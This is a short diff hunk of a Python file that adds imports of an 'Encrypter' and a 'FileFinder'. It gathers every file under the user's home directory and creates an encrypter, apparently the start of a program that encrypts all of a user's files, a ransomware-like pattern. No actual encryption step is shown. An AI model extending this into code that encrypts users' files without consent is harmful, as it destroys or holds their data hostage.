@@ -27,9 +27,17 @@
 # SOFTWARE.
 
 import logging
+from pathlib import Path
 
-from .file_utils import FileUtils
+from encrypter import Encrypter
+from file_finder import FileFinder
 
 logging.basicConfig(level=logging.INFO)
+
+finder = FileFinder()
+
+finder.get_all_files(Path.home())
+
+enc = Encrypter()
 
 
